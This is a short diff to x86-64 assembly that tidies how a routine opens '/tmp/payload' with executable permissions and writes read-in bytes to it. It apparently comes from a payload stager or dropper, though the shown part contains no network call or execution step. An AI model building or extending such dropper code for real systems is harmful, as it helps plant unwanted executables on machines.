@@ -48,19 +48,10 @@ _start:
     ; open("/tmp/payload", O_CREAT|O_WRONLY|O_TRUNC, 0755)
     mov rax, 2
     lea rdi, [rel path]
-    ; O_CREAT = 64 (create file)
-    ; O_WRONLY = 1 (write file)
-    ; O_TRUNC = 512 (remove old content 
-    mov rsi, 577
+    mov rsi, 0o1101 ; octal for O_CREAT|O_WRONLY|O_TRUNC
     mov rdx, 0o0755 ; make executable
     syscall ; rax will have filefd
     mov r12, rax ; save filefd in r12
-
-    ; fchmod(filefd, 0755)
-    mov rax, 91
-    mov rdi, r12
-    mov rsi, 0o0755
-    syscall
     
     ; write(filefd, buffer, bytes_read)
     mov rax, 1
